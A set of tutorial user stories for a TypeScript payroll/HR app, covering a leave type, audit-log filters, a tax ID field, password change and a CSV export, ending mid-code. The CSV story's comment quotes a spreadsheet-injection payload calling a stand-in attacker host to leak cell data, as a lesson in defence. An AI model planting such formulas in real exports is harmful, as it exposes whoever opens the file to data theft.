# Stories 11–15 — mid-level: features across layers

Not implemented. See the [index](README.md) for how to use these and for the warning
about line numbers.

These stories cross layers: shared contract → database → service → route → tests → web.
Work **from the contract inward** — schema and DTO first, then the server, then the UI.
TypeScript will tell you what you have not finished.

---

## US-11 — A new time-off type: bereavement

**Level:** mid · **Area:** shared + database + api · **Size:** ~3 hours

> As an employee who has lost a family member, I want to request bereavement leave, so
> that it is recorded properly and does not come out of my vacation balance.

**What you will learn.** Adding a value to an enum that is *also a Postgres enum type*
needs a migration — and Postgres has a rule about that which surprises people.

### Acceptance criteria

- `bereavement` is a valid time-off type everywhere: API, database, web form.
- It does not reduce the vacation balance.
- A single bereavement request may cover at most 5 working days
  (`400 bereavement_limit`).
- The request form offers it with no web code change.

### Files

- `packages/shared/src/enums.ts`, `constants.ts` (change)
- `apps/api/drizzle/000N_add_bereavement_time_off.sql` (generated)
- `apps/api/src/modules/time-off/service.ts` (change)
- `apps/api/src/modules/time-off/time-off.test.ts` (add tests)
- `docs/api-contract.md` (add a rule)

### Steps

**1. Add the value — at the end.** `packages/shared/src/enums.ts`, line 70:

```ts
// anchor:
export const TIME_OFF_TYPES = ['vacation', 'sick', 'unpaid', 'parental'] as const;
// change to:
export const TIME_OFF_TYPES = ['vacation', 'sick', 'unpaid', 'parental', 'bereavement'] as const;
```

Append; do not insert in the middle. Postgres enums have an order, and the migration tool
generates the simplest SQL when the new value comes last.

**2. Add the limit.** `packages/shared/src/constants.ts`:

```ts
/** Working days allowed in a single bereavement request. */
export const BEREAVEMENT_MAX_DAYS = 5;
```

**3. Typecheck everything now.** `npm run typecheck`. This one tuple feeds the database
schema (`pgEnum('time_off_type', TIME_OFF_TYPES)`), the request validator
(`z.enum(TIME_OFF_TYPES)`) and the web form's dropdown. If any code does an exhaustive
`switch` on the type, the compiler shows you where. Fix whatever it reports before going
on.

**4. Generate the migration.**

```bash
npm run db:generate -- --name add_bereavement_time_off
```

Open the new file in `apps/api/drizzle/`. It should contain exactly one statement,
approximately:

```sql
ALTER TYPE "public"."time_off_type" ADD VALUE 'bereavement';
```

If it contains anything else — a dropped table, a recreated type — **stop**. Something in
`schema.ts` changed that you did not intend. Delete the generated file and the new
snapshot under `drizzle/meta/`, undo the stray change, and generate again.

**5. Apply it:** `npm run db:migrate`.

> **The Postgres rule.** A value added with `ALTER TYPE … ADD VALUE` cannot be *used* in
> the same transaction that added it. The migration runner applies all pending migrations
> inside one transaction. So a migration that adds the value **and**, say, updates rows
> to use it will fail. Here the migration only adds the value, so it is fine — but if you
> ever need both, they must be two separate deployments. Also: Postgres cannot remove an
> enum value. This migration has no clean "down".

**6. The business rule.** In `time-off/service.ts`, add `BEREAVEMENT_MAX_DAYS` to the
import from `@meridian/shared` (lines 1–14). Then in `createRequest` (search for
`export async function createRequest`), find where the working days are checked — search
for `no_working_days`. Directly **after** that check, and before the overlap query, add:

```ts
    if (input.type === 'bereavement' && days > BEREAVEMENT_MAX_DAYS) {
      throw badRequest(
        `Bereavement leave is limited to ${BEREAVEMENT_MAX_DAYS} working days per request`,
        'bereavement_limit',
      );
    }
```

The business-day count is the local variable `days` (line 241:
`const days = countBusinessDays(input.startDate, input.endDate);`).

**7. Confirm the balance is unaffected.** Search the file for `'vacation'`. You will find
two places (lines 100 and 261): the balance query filters on
`eq(timeOffRequests.type, 'vacation')`, and the balance *check* is inside
`if (input.type === 'vacation')`. Both are explicitly about vacation, so a new type is
excluded automatically. **No change needed — but you had to look to know that.**

**8. Contract.** In `docs/api-contract.md`, Time off → Create, add:

```
  - `bereavement` only: `days` > `BEREAVEMENT_MAX_DAYS` (5) → `400 bereavement_limit`.
    Bereavement, sick, unpaid and parental leave do not affect the vacation balance.
```

### Tests

In `time-off.test.ts`. Look at how existing tests there pick dates (they compute dates
relative to today and use a logged-in worker) and copy that setup. Three tests:

```ts
  it('accepts bereavement leave and leaves the vacation balance untouched', async () => {
    // arrange: an active employee with a portal login, as the other tests in this file do
    // act: POST /time-off/requests { type: 'bereavement', startDate, endDate } for 3 working days
    // assert: 201, body.type === 'bereavement', body.days === 3
    // assert: GET /time-off/balance → usedDays 0 and pendingDays 0
  });

  it('refuses more than 5 working days of bereavement in one request', async () => {
    // a Monday-to-next-Monday range = 6 working days → 400, error.code 'bereavement_limit'
  });

  it('accepts exactly 5 working days', async () => {
    // Monday to Friday → 201
  });
```

Write these out in full using the file's own helpers — choosing the dates is the
exercise. Remember start and end must be in the same calendar year (`400 spans_years`),
so do not pick the last week of December.

### Verify

```bash
(cd apps/api && npx vitest run src/modules/time-off)
npm run dev      # sign in as lena.fischer@acme.test → Time off → Request time off
```

The dropdown should list "Bereavement" — `RequestTimeOffModal.tsx` (line 111) maps over
`TIME_OFF_TYPES`. That is the single-source-of-truth idea from the build journal's
chapter 6.1 paying off: one edit, three layers.

### Pitfalls

- The API tests rebuild their database from **all** migrations each run. If your
  migration is wrong, *every* API test fails in global setup. Read the first error.
- `StatusBadge` colours statuses, not types, so nothing to add there.

### Stretch

Bereavement leave is usually approved without question. Auto-approve it at creation
(status `approved`, with an audit record `time_off.approved` and
`metadata: { automatic: true }`). Which existing checks must still run first?

---

## US-12 — Filter the audit log by action and date

**Level:** mid · **Area:** shared + api + web · **Size:** ~4 hours

> As a client admin preparing for an audit, I want to filter the audit log by what
> happened and when, so that I can answer "who approved payroll in October?" without
> scrolling.

**Today** the log filters only by entity type (`apps/api/src/modules/audit/service.ts`,
lines 13–15).

### Acceptance criteria

- `GET /audit-logs` accepts `action`, `from` and `to` (dates, inclusive).
- `to=2026-10-31` includes events at 23:59 on the 31st.
- `from` after `to` → `400 validation_error`.
- Results stay tenant-scoped and newest first.
- The Audit log page has an action box and two date inputs.

### Files

- `packages/shared/src/schemas.ts` (change)
- `apps/api/src/modules/audit/service.ts` (change)
- `apps/api/src/modules/audit/audit.test.ts` (add tests)
- `apps/web/src/pages/audit/AuditLogPage.tsx` (change)
- `docs/api-contract.md`

### Steps — contract

**1. Extend the query schema.** `packages/shared/src/schemas.ts`, line 303:

```ts
// anchor:
export const listAuditLogsQuerySchema = paginationSchema.extend({
  entityType: z.string().trim().max(60).optional(),
  entityId: uuidSchema.optional(),
});
```

Replace with:

```ts
export const listAuditLogsQuerySchema = paginationSchema
  .extend({
    entityType: z.string().trim().max(60).optional(),
    entityId: uuidSchema.optional(),
    /** Exact action name, e.g. `payroll_run.approved`. */
    action: z.string().trim().max(80).optional(),
    /** Inclusive calendar dates (UTC). */
    from: isoDateSchema.optional(),
    to: isoDateSchema.optional(),
  })
  .refine((q) => !q.from || !q.to || q.from <= q.to, {
    message: '"from" must be on or before "to"',
    path: ['from'],
  });
```

`isoDateSchema` is defined near the top of the same file. The `ListAuditLogsQuery` type
on the next line is inferred, so it updates itself.

### Steps — API

**2. Imports.** In `audit/service.ts`:

```ts
// line 1 — add addDays:
import { addDays, type AuditLogDto, type ListAuditLogsQuery, type Paginated } from '@meridian/shared';
// line 2 — add gte and lt:
import { and, count, desc, eq, gte, lt, type SQL } from 'drizzle-orm';
```

(The existing line 1 is `import type { … }`. Because you are now importing a *value*
(`addDays`) as well as types, switch to the inline `type` form shown — the project's
`verbatimModuleSyntax` setting requires type-only imports to be marked.)

**3. Filters.** After line 15 (`if (query.entityId) …`), add:

```ts
  if (query.action) filters.push(eq(auditLogs.action, query.action));
  // Dates are inclusive calendar days in UTC. "to" must include the whole day, so
  // compare with the START OF THE NEXT DAY, exclusive — never with 23:59:59.
  if (query.from) filters.push(gte(auditLogs.createdAt, new Date(`${query.from}T00:00:00Z`)));
  if (query.to) filters.push(lt(auditLogs.createdAt, new Date(`${addDays(query.to, 1)}T00:00:00Z`)));
```

The routes file needs no change: it already passes the parsed query through.

**4. Contract.** In `docs/api-contract.md`, Audit & dashboard → Rules, add:

```
- `GET /audit-logs` also filters by `action` (exact match) and by `from` / `to`
  (inclusive UTC calendar dates). `from` after `to` → `400 validation_error`.
```

### Tests — API

In `audit.test.ts`. Audit rows are written by the API with `created_at = now()`, so to
test date filters insert rows directly with chosen timestamps. Check how that file
already inserts audit rows and reuse it; the shape is:

```ts
await db.insert(auditLogs).values([
  { organizationId: org.id, action: 'worker.created', entityType: 'worker', createdAt: new Date('2026-10-01T00:00:00Z') },
  { organizationId: org.id, action: 'payroll_run.approved', entityType: 'payroll_run', createdAt: new Date('2026-10-31T23:59:59Z') },
  { organizationId: org.id, action: 'payroll_run.approved', entityType: 'payroll_run', createdAt: new Date('2026-11-01T00:00:00Z') },
]);
```

Tests to write:

1. `?action=payroll_run.approved` returns 2 entries, none with another action.
2. `?from=2026-10-01&to=2026-10-31` returns the first two — **including the 23:59:59
   one**. This is the test that fails if someone "simplifies" the upper bound.
3. `?to=2026-10-31` excludes the 1 November entry.
4. `?from=2026-11-01&to=2026-10-01` → 400 with `details.from`.
5. `?from=31/10/2026` → 400 (not an ISO date).
6. A second tenant with a matching row: the filter never returns it.

### Steps — web

**5. State.** In `AuditLogPage.tsx`, line 162–164:

```tsx
  const [entityType, setEntityType] = useState('');
  const [offset, setOffset] = useState(0);
  const logs = useAuditLogs({ entityType: entityType || undefined, limit: PAGE_SIZE, offset });
```

becomes:

```tsx
  const [entityType, setEntityType] = useState('');
  const [action, setAction] = useState('');
  const [from, setFrom] = useState('');
  const [to, setTo] = useState('');
  const [offset, setOffset] = useState(0);
  const logs = useAuditLogs({
    entityType: entityType || undefined,
    action: action.trim() || undefined,
    from: from || undefined,
    to: to || undefined,
    limit: PAGE_SIZE,
    offset,
  });
```

**6. Inputs.** The filter bar is the `<div className="border-b border-ink-200 p-4 sm:max-w-xs">`
wrapping the entity-type `<Select>` (line 173). Change its class so it can hold four
controls:

```tsx
        <div className="grid grid-cols-1 gap-3 border-b border-ink-200 p-4 sm:grid-cols-2 lg:grid-cols-4">
```

and add after the closing `</Select>`:

```tsx
          <Input
            label="Action"
            placeholder="e.g. payroll_run.approved"
            value={action}
            onChange={(event) => {
              setAction(event.target.value);
              setOffset(0);
            }}
          />
          <Input
            label="From"
            type="date"
            value={from}
            max={to || undefined}
            onChange={(event) => {
              setFrom(event.target.value);
              setOffset(0);
            }}
          />
          <Input
            label="To"
            type="date"
            value={to}
            min={from || undefined}
            onChange={(event) => {
              setTo(event.target.value);
              setOffset(0);
            }}
          />
```

Add `Input` to the page's import from `'../../components/ui'`.

Every filter change resets `offset` to 0. Forget that and a user on page 5 who narrows
the filter sees an empty page 5 of a result that only has one page.

### Verify

`npx tsc -p apps/web`, `cd apps/api && npx vitest run src/modules/audit`, then filter the
seeded log by `payroll_run.approved`.

### Pitfalls

- Typing in the action box fires a request per keystroke. It works (`useAuditLogs` keeps
  the previous page on screen while loading) but it is wasteful — see the stretch.
- An empty string from a date input must become `undefined`, or the API receives `from=`
  and rejects it.
- The `min`/`max` attributes are a convenience. The server's `refine` is the real check.

### Stretch

Debounce the action box the way `WorkersPage.tsx` debounces its search (look for
`SEARCH_DEBOUNCE_MS`). Then keep all four filters in the URL with `useSearchParams`, so a
filtered view can be bookmarked and shared.

---

## US-13 — A tax ID on the organization

**Level:** mid · **Area:** database + shared + api + web · **Size:** ~4 hours

> As a client admin in the EU, I want to record my company's VAT number, so that it can
> be printed on invoices.

**What you will learn.** The full vertical path of a new field: column → migration → DTO
→ request schema → service mapper → form. Every "add a field" task you ever do follows
this path.

### Acceptance criteria

- `organizations.tax_id` exists, nullable, at most 40 characters.
- `GET /organization` returns `taxId` (string or null).
- `PATCH /organization` accepts `taxId`; an empty string clears it to null.
- The settings form has a "Tax ID" field.
- Only admins can change it (already true of the endpoint — keep it true).

### Files

- `apps/api/src/db/schema.ts` → generated migration
- `packages/shared/src/dto.ts`, `schemas.ts`
- `apps/api/src/modules/organizations/service.ts`, `organizations.test.ts`
- `apps/web/src/pages/settings/OrganizationSettingsPage.tsx`
- `docs/api-contract.md` is unaffected (it refers to the DTO by name)

### Steps

**1. Column.** `apps/api/src/db/schema.ts`, the `organizations` table (line 111). After
`billingEmail`:

```ts
  billingEmail: text('billing_email').notNull(),
  /** VAT / GST / EIN, as the client writes it. Optional. */
  taxId: text('tax_id'),
  createdAt: createdAt(),
```

Nullable, with no default. That is what makes this migration safe to run on a table that
already has rows: adding a nullable column does not rewrite existing rows or need a value
for them. A `NOT NULL` column without a default would fail on a non-empty table.

**2. Migration.**

```bash
npm run db:generate -- --name add_organization_tax_id
```

Expected content: `ALTER TABLE "organizations" ADD COLUMN "tax_id" text;` — one
statement. Read it, then `npm run db:migrate`.

**3. Response type.** `packages/shared/src/dto.ts`, `OrganizationDto` (line 73). Add
after `billingEmail`:

```ts
  billingEmail: string;
  taxId: string | null;
```

Run `npx tsc -p apps/api`. It now **fails** in `organizations/service.ts`, because
`toOrganizationDto` does not return `taxId`. That failure is the system working: the
compiler is listing what is left to do.

**4. Mapper.** `organizations/service.ts`, `toOrganizationDto` (line 24):

```ts
    billingEmail: row.billingEmail,
    taxId: row.taxId,
    createdAt: iso(row.createdAt),
```

This is the "explicit field list" rule from the build journal (chapter 9.2) in action.
The new column was invisible to API clients until this line — a new column is private by
default.

**5. Request schema.** `packages/shared/src/schemas.ts`, `updateOrganizationSchema`
(line 73):

```ts
export const updateOrganizationSchema = z
  .object({
    name: nameSchema,
    legalName: nameSchema,
    billingEmail: emailSchema,
    countryCode: countryCodeSchema,
    /** Empty string means "clear it". */
    taxId: z
      .string()
      .trim()
      .max(40)
      .transform((value) => (value === '' ? null : value))
      .nullable(),
  })
  .partial();
```

The form sends a string; the database wants `null` for "none". The schema is the
boundary where that translation belongs — once here, rather than in every caller.

**6. Service.** `updateOrganization` does `.set(input)` with the validated input. Because
the schema's key (`taxId`) matches the Drizzle column property (`taxId`), no further
change is needed. Read the function to confirm that for yourself.

### Tests — API

In `organizations.test.ts`, inside `describe('organization profile', …)`:

```ts
  it('stores, returns and clears a tax ID', async () => {
    const { admin } = await createTenant();

    expect((await admin.get('/organization')).body.taxId).toBeNull();

    const set = await admin.patch('/organization').send({ taxId: '  DE123456789 ' });
    expect(set.status).toBe(200);
    expect(set.body.taxId).toBe('DE123456789'); // trimmed

    const cleared = await admin.patch('/organization').send({ taxId: '' });
    expect(cleared.body.taxId).toBeNull();
  });

  it('rejects a tax ID longer than 40 characters', async () => {
    const { admin } = await createTenant();
    const res = await admin.patch('/organization').send({ taxId: 'X'.repeat(41) });
    expect(res.status).toBe(400);
    expect(res.body.error.details.taxId).toBeDefined();
  });

  it('does not let a manager set it', async () => {
    const { org } = await createTenant();
    const manager = await createManager(org.id);
    expect((await manager.client.patch('/organization').send({ taxId: 'X1' })).status).toBe(403);
  });
```

### Steps — web

**7. Form values.** `OrganizationSettingsPage.tsx`, `toFormValues` (line 40):

```ts
const toFormValues = (org: OrganizationDto) => ({
  name: org.name,
  legalName: org.legalName,
  billingEmail: org.billingEmail,
  countryCode: org.countryCode,
  taxId: org.taxId ?? '',
});
```

A text input cannot hold `null`, so the form's draft uses `''` and the schema turns it
back into `null` on submit.

**8. Field.** After the billing email `<Input … />` (ends line 89) and before the
`<Select label="Headquarters country"`:

```tsx
        <Input
          label="Tax ID"
          hint="VAT, GST or EIN number. Optional."
          maxLength={40}
          {...form.field('taxId')}
        />
```

**9. Fix what the compiler finds.** `npx tsc -p apps/web`. Any test fixture or mock that
builds an `OrganizationDto` object now lacks `taxId` — add `taxId: null` to each.

### Verify

```bash
npm run typecheck
(cd apps/api && npx vitest run src/modules/organizations)
(cd apps/web && npx vitest run src/pages/settings)
npm run dev      # admin@acme.test → Settings
```

### Pitfalls

- Order matters for your own sanity: DTO first, then let the compiler drive.
- `useZodForm`'s `field()` returns the value as a string, which is why the form uses `''`
  and not `null`.
- Do not "validate" the format of the tax ID. Formats differ in every country and a
  too-strict pattern rejects real numbers. Length and trimming are enough.

### Stretch

Print the tax ID on invoices. `InvoiceDetailDto` has `organizationName` (search
`invoices/service.ts` for where it is filled in); add `organizationTaxId`, and show it in
`InvoiceDetailPage.tsx` under the bill-to name. Should a *past* invoice change when the
tax ID is edited later? (Compare with how contracts snapshot their terms — build journal,
chapter 7.4.)

---

## US-14 — Change my password

**Level:** mid · **Area:** shared + api · **Size:** ~4 hours

> As any user, I want to change my password while signed in, so that I can replace one I
> suspect has leaked.

**Security-sensitive.** Read the build journal's chapter 8.4 first. The rules: require
the current password; never say more than necessary in an error; end the *other*
sessions afterwards.

### Acceptance criteria

- `POST /auth/change-password { currentPassword, newPassword }` → `204`.
- Wrong current password → `400 invalid_current_password`. Repeated failures are
  rate-limited (`429`).
- The new password must satisfy the same rules as at sign-up, and differ from the
  current one.
- Every *other* session of the user is ended; the session making the request survives.
- The old password no longer logs in; the new one does.
- An audit record is written. Neither password appears in it, or in any log.

### Files

- `packages/shared/src/schemas.ts`
- `apps/api/src/lib/sessions.ts`
- `apps/api/src/modules/auth/service.ts`, `routes.ts`, `auth.test.ts`
- `docs/api-contract.md`

### Steps

**1. Request schema.** `schemas.ts`, after `acceptInviteSchema` and its type (line 71):

```ts
export const changePasswordSchema = z
  .object({
    currentPassword: z.string().min(1).max(200),
    newPassword: passwordSchema,
  })
  .refine((v) => v.currentPassword !== v.newPassword, {
    message: 'The new password must be different from the current one',
    path: ['newPassword'],
  });
export type ChangePasswordInput = z.infer<typeof changePasswordSchema>;
```

`currentPassword` deliberately has **no** strength rule (same as `loginSchema`): if the
rules were tightened after a user chose their password, they must still be able to type
the old one.

**2. A session helper.** `apps/api/src/lib/sessions.ts`. Add `ne` to the first import:

```ts
import { and, eq, gt, lt, ne } from 'drizzle-orm';
```

and add after `deleteUserSessions` (line 64):

```ts
/** End every session of a user EXCEPT one — used after a password change. */
export async function deleteOtherUserSessions(
  dbOrTx: DbOrTx,
  userId: string,
  keepSessionId: string,
): Promise<void> {
  await dbOrTx
    .delete(sessions)
    .where(and(eq(sessions.userId, userId), ne(sessions.id, keepSessionId)));
}
```

**3. Service.** `auth/service.ts`. Extend imports:

```ts
// from '@meridian/shared' type imports — add:
  ChangePasswordInput,
// from '../../lib/errors' — add badRequest if it is not already imported
// from '../../lib/sessions':
import { createSession, deleteOtherUserSessions } from '../../lib/sessions';
// and, if not already present from US-07:
import type { Actor } from '../../lib/actor';
```

Add at the end of the file:

```ts
export async function changePassword(
  actor: Actor,
  sessionId: string,
  input: ChangePasswordInput,
): Promise<void> {
  // Reuse the login limiter, keyed by user: a stolen session must not be a way to
  // guess the password ten thousand times.
  const limiterKey = `change-password:${actor.userId}`;
  loginLimiter.hit(limiterKey);

  const [user] = await db
    .select({ passwordHash: users.passwordHash })
    .from(users)
    .where(eq(users.id, actor.userId))
    .limit(1);
  if (!user) throw unauthorized();

  if (!(await verifyPassword(input.currentPassword, user.passwordHash))) {
    throw badRequest('Your current password is not correct', 'invalid_current_password');
  }
  loginLimiter.clear(limiterKey);

  const passwordHash = await hashPassword(input.newPassword);
  await db.transaction(async (tx) => {
    await tx.update(users).set({ passwordHash }).where(eq(users.id, actor.userId));
    // Whoever else is signed in as this user — possibly the thief — is signed out.
    await deleteOtherUserSessions(tx, actor.userId, sessionId);
    await recordAudit(tx, actor, {
      action: 'user.password_changed',
      entityType: 'user',
      entityId: actor.userId,
      // No metadata. Never put a password, or a hash, anywhere near an audit log.
    });
  });
}
```

`hashPassword`, `verifyPassword`, `users`, `eq`, `unauthorized`, `recordAudit` and
`loginLimiter` are all already in that file.

Why hash **outside** the transaction? scrypt takes around a hundred milliseconds by
design. Holding a database transaction open for that long, for no reason, ties up a
connection. Do slow work first, then open the transaction for the fast writes.

**4. Route.** `auth/routes.ts`. Add `changePasswordSchema` to the import from
`@meridian/shared` and `unauthorized` to the import from `'../../lib/errors'`. After the
`/auth/me` handler (line 50):

```ts
authRouter.post('/auth/change-password', authenticate, async (req, res) => {
  const input = parseBody(changePasswordSchema, req);
  if (!req.sessionId) throw unauthorized();
  await service.changePassword(getActor(req), req.sessionId, input);
  res.status(204).end();
});
```

`req.sessionId` is set by the `authenticate` middleware (see
`apps/api/src/lib/actor.ts`, where the property is declared).

**5. Contract.** Auth table:

```
| POST | `/auth/change-password` | any | `changePasswordSchema` → 204 |
```

and a rule: wrong current password → `400 invalid_current_password`; rate-limited like
login; ends the caller's other sessions.

### Tests

In `auth.test.ts`. `TEST_PASSWORD` is the password every factory user has.

```ts
describe('POST /auth/change-password', () => {
  const NEW = 'a-brand-new-password';

  it('changes the password: the old one stops working, the new one works', async () => {
    const { adminUser, admin } = await createTenant();
    const res = await admin
      .post('/auth/change-password')
      .send({ currentPassword: TEST_PASSWORD, newPassword: NEW });
    expect(res.status).toBe(204);

    const oldLogin = await anonymous().post('/auth/login').send({ email: adminUser.email, password: TEST_PASSWORD });
    const newLogin = await anonymous().post('/auth/login').send({ email: adminUser.email, password: NEW });
    expect(oldLogin.status).toBe(401);
    expect(newLogin.status).toBe(200);
  });

  it('keeps this session and ends the others', async () => {
    const { adminUser } = await createTenant();
    const here = await loginAs(adminUser);
    const elsewhere = await loginAs(adminUser);

    await here.post('/auth/change-password').send({ currentPassword: TEST_PASSWORD, newPassword: NEW }).expect(204);

    expect((await here.get('/auth/me')).status).toBe(200);
    expect((await elsewhere.get('/auth/me')).status).toBe(401);
  });

  it('refuses a wrong current password and changes nothing', async () => {
    const { adminUser, admin } = await createTenant();
    const res = await admin.post('/auth/change-password').send({ currentPassword: 'not-it', newPassword: NEW });
    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('invalid_current_password');
    const login = await anonymous().post('/auth/login').send({ email: adminUser.email, password: TEST_PASSWORD });
    expect(login.status).toBe(200);
  });

  it('applies the sign-up password rules to the new password', async () => {
    const { admin } = await createTenant();
    const res = await admin.post('/auth/change-password').send({ currentPassword: TEST_PASSWORD, newPassword: 'short' });
    expect(res.status).toBe(400);
    expect(res.body.error.details.newPassword).toBeDefined();
  });

  it('refuses a new password equal to the current one', async () => {
    const { admin } = await createTenant();
    const res = await admin
      .post('/auth/change-password')
      .send({ currentPassword: TEST_PASSWORD, newPassword: TEST_PASSWORD });
    expect(res.status).toBe(400);
  });

  it('requires a session', async () => {
    const res = await anonymous().post('/auth/change-password').send({ currentPassword: 'x', newPassword: NEW });
    expect(res.status).toBe(401);
  });

  it('never writes either password to the audit log', async () => {
    const { admin } = await createTenant();
    await admin.post('/auth/change-password').send({ currentPassword: TEST_PASSWORD, newPassword: NEW });
    const logs = await db.select().from(auditLogs);
    const text = JSON.stringify(logs);
    expect(text).toContain('user.password_changed');
    expect(text).not.toContain(NEW);
    expect(text).not.toContain(TEST_PASSWORD);
  });
});
```

### Verify

`cd apps/api && npx vitest run src/modules/auth`.

### Pitfalls

- The test factories share **one precomputed hash** for speed (`test/helpers.ts`). That
  is fine here because each test creates its own user row; you are updating a row, not
  the shared constant.
- Do not log `input`. `pino` redacts cookies and auth headers, not request bodies.
- `400` for a wrong current password, not `401`. A `401` would trigger the web app's
  global "you have been signed out" handler in `api.ts` and bounce a logged-in user to
  the login page for mistyping.

### Stretch

Build the UI: a "Change password" modal opened from the user menu, using `useZodForm`
with `changePasswordSchema`, three `PasswordInput`s (US-02) including a "confirm new
password" that exists only in the form. Where does the "passwords match" rule belong —
shared schema or form?

---

## US-15 — Export people to CSV

**Level:** mid · **Area:** api + web · **Size:** ~5 hours

> As an HR manager, I want to download the people list as a spreadsheet, so that I can
> share headcount with finance.

**What you will learn.** Returning something other than JSON; route ordering in Express;
and **CSV injection**, a real vulnerability that is easy to ship without noticing.

### Acceptance criteria

- `GET /workers/export` (staff) returns `text/csv` as an attachment, honouring the same
  filters as the list (`status`, `type`, `countryCode`, `search`).
- It exports up to 5,000 rows, tenant-scoped, in the list's order.
- Values with commas, quotes or newlines are correctly quoted.
- A cell that begins with `=`, `+`, `-`, `@`, tab or carriage return is neutralised.
- Salary is in major units with the currency in its own column.
- The export is audited.
- The People page has an "Export CSV" button that respects the current filters.

### Files

- `apps/api/src/lib/csv.ts` (new) + `csv.test.ts` (new)
- `apps/api/src/modules/workers/service.ts`, `routes.ts`, `workers.test.ts`
- `apps/web/src/api/workers.ts`, `apps/web/src/pages/workers/WorkersPage.tsx`
- `docs/api-contract.md`

### Steps — the CSV helper (pure, test it first)

**1. Create `apps/api/src/lib/csv.ts`:**

```ts
/**
 * Minimal CSV writer (RFC 4180) with spreadsheet-injection protection.
 *
 * CSV INJECTION: if a cell starts with = + - @ (or tab / carriage return), Excel
 * and Google Sheets treat it as a FORMULA. A worker whose "job title" is
 *   =HYPERLINK("http://evil.example/?x="&A1,"Click")
 * turns our export into an attack on whoever opens it. The standard defence
 * (OWASP) is to prefix such cells with a single quote so they are read as text.
 */
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

export function csvCell(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '';
  // Numbers are our own data (not user text), so a negative number is not escaped.
  let text = typeof value === 'number' ? String(value) : value;
  if (typeof value === 'string' && FORMULA_TRIGGER.test(text)) text = `'${text}`;
  // Quote when the cell contains a delimiter, a quote or a line break; double any quotes.
  return /[",\r\n]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

export function toCsv(header: string[], rows: (string | number | null | undefined)[][]): string {
  const lines = [header, ...rows].map((row) => row.map(csvCell).join(','));
  // \r\n line endings per the RFC. A leading BOM makes Excel read the file as UTF-8.
  return `﻿${lines.join('\r\n')}\r\n`;
}
```

**2. Create `apps/api/src/lib/csv.test.ts`.** This file touches no database, but it
lives under `apps/api/src`, so it still runs with that package's setup. That is fine.

```ts
import { describe, expect, it } from 'vitest';
import { csvCell, toCsv } from './csv';

describe('csvCell', () => {
  it('leaves plain values alone', () => {
    expect(csvCell('Ada')).toBe('Ada');
    expect(csvCell(42)).toBe('42');
    expect(csvCell(null)).toBe('');
  });
  it('quotes commas, quotes and newlines', () => {
    expect(csvCell('Lovelace, Ada')).toBe('"Lovelace, Ada"');
    expect(csvCell('She said "hi"')).toBe('"She said ""hi"""');
    expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
  });
  it.each(['=1+1', '+1', '-1', '@SUM(A1)', '\tx', '\rx'])('neutralises the formula trigger in %j', (v) => {
    expect(csvCell(v).replace(/^"/, '')).toMatch(/^'/);
  });
  it('does not escape a negative NUMBER', () => {
    expect(csvCell(-5)).toBe('-5');
  });
});

describe('toCsv', () => {
  it('writes a header, CRLF line endings and a BOM', () => {
    expect(toCsv(['a', 'b'], [['1', '2']])).toBe('﻿a,b\r\n1,2\r\n');
  });
});
```

### Steps — API

**3. Share the filter logic.** In `workers/service.ts`, `listWorkers` (line 178) builds
its `conditions` on lines 183–198. The export needs identical filtering, and two copies
would drift. Extract them — add this function just above `listWorkers`:

```ts
type WorkerFilters = Pick<ListWorkersQuery, 'status' | 'type' | 'countryCode' | 'search'>;

/** The WHERE clause shared by the list and the export, so they can never disagree. */
function workerFilters(orgId: string, query: WorkerFilters): SQL | undefined {
  const conditions: SQL[] = [eq(workers.organizationId, orgId)];
  if (query.status) conditions.push(eq(workers.status, query.status));
  if (query.type) conditions.push(eq(workers.type, query.type));
  if (query.countryCode) conditions.push(eq(workers.countryCode, query.countryCode));
  if (query.search) {
    // Parameterised, so this is not an injection risk — escaping only stops
    // "100%" from meaning "100 followed by anything".
    const pattern = `%${escapeLike(query.search)}%`;
    const match = or(
      ilike(workers.firstName, pattern),
      ilike(workers.lastName, pattern),
      ilike(workers.email, pattern),
      ilike(workers.jobTitle, pattern),
    );
    if (match) conditions.push(match);
  }
  return and(...conditions);
}
```

Then in `listWorkers`, delete lines 183–199 (from `const conditions` through
`const where = and(...conditions);`) and put in their place:

```ts
  const where = workerFilters(orgId, query);
```

**Run the workers tests now, before going further.** A refactor should change nothing;
prove it while the change is still small.

**4. The export function.** Add imports at the top of the file:

```ts
import { minorUnitDigits } from '@meridian/shared';   // add to the existing import list
import { toCsv } from '../../lib/csv';
```

and add after `listWorkers`:

```ts
export const EXPORT_ROW_LIMIT = 5000;

/** The people list as CSV. Same filters and order as the list; capped, and audited. */
export async function exportWorkersCsv(actor: Actor, query: WorkerFilters): Promise<string> {
  const orgId = requireOrgId(actor);
  const rows = await db
    .select({ worker: workers, countryName: countries.name })
    .from(workers)
    .innerJoin(countries, eq(countries.code, workers.countryCode))
    .where(workerFilters(orgId, query))
    .orderBy(asc(workers.lastName), asc(workers.firstName), asc(workers.id))
    .limit(EXPORT_ROW_LIMIT);

  // Exporting personal data is itself an event worth recording.
  await recordAudit(db, actor, {
    action: 'workers.exported',
    entityType: 'worker',
    metadata: { rows: rows.length, filters: { ...query } },
  });

  return toCsv(
    ['First name', 'Last name', 'Email', 'Job title', 'Department', 'Country', 'Type', 'Status',
     'Start date', 'End date', 'Salary', 'Currency', 'Pay basis'],
    rows.map(({ worker: w, countryName }) => [
      w.firstName, w.lastName, w.email, w.jobTitle, w.department, countryName, w.type, w.status,
      w.startDate, w.endDate,
      // Major units as text with the right number of decimals: 6000000 EUR minor -> "60000.00".
      (w.salaryMinor / 10 ** minorUnitDigits(w.currency)).toFixed(minorUnitDigits(w.currency)),
      w.currency, w.payBasis,
    ]),
  );
}
```

**5. The route — order matters.** In `workers/routes.ts`, the list route is at line 15
and `/workers/:id` at line 26. Express tries routes **in the order they were
registered**. If `/workers/export` is registered after `/workers/:id`, Express matches
`:id = "export"`, `uuidParam` rejects it, and the client gets a baffling
`400 Expected a UUID`. So add the new route **between the list route and the POST**
(after line 18):

```ts
// Must be registered BEFORE '/workers/:id', or Express treats "export" as an id.
workersRouter.get('/workers/export', authenticate, requireStaff, async (req, res) => {
  const { status, type, countryCode, search } = parseQuery(listWorkersQuerySchema, req);
  const csv = await service.exportWorkersCsv(getActor(req), { status, type, countryCode, search });
  res
    .status(200)
    .type('text/csv; charset=utf-8')
    .setHeader('Content-Disposition', 'attachment; filename="people.csv"')
